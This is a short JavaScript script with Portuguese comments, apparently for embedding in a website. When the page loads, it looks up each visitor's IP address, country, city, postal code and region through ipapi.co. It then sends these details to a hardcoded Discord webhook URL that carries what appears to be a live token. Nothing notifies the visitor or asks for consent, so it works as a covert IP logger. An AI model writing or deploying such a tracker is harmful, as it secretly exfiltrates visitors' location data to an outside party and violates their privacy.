// Cole aqui o seu link real do webhook do Discord
const webhookURL = "https://discord.com/api/webhooks/1564710399645843656/zIRhv338ls6cRwmacg77Utb9nIUSGSG_4i0pHT6Y7sViS0k0eK-5pr5Y0Qib5hoVrkbN";

async function sendVisitorData() {
  try {
    // 1. Busca os dados de IP do usuário usando HTTPS
    let response = await fetch("https://ipapi.co/json/", {
      method: 'GET',
      headers: {
        "accept": "application/json"
      }
    });

    let data = await response.json();

    if (!data || data.error) {
      console.log("Não foi possível obter os dados de IP.");
      return;
    }

    // 2. Prepara o payload para o Discord
    let payload = {
      content: "Novo visitante detectado no site!",
      embeds: [{
        title: "Informações do Visitante",
        type: "rich",
        color: 15158332, // Cor vermelha em decimal para o embed do Discord
        description: "Dados capturados do navegador.",
        fields: [
          { name: "IP", value: data.ip || "Desconhecido", inline: false },
          { name: "País", value: data.country_name || "Desconhecido", inline: false },
          { name: "Cidade", value: data.city || "Desconhecido", inline: false },
          { name: "CEP / ZIP", value: data.postal || "Desconhecido", inline: false },
          { name: "Região", value: data.region || "Desconhecido", inline: false }
        ],
        footer: {
          text: "Sistema automatizado"
        }
      }]
    };

    // 3. Envia para o Webhook do Discord
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    console.log("Dados enviados com sucesso!");

  } catch (err) {
    console.log("Erro na execução:", err);
  }
}

// Executa a função assim que o script carregar
sendVisitorData();
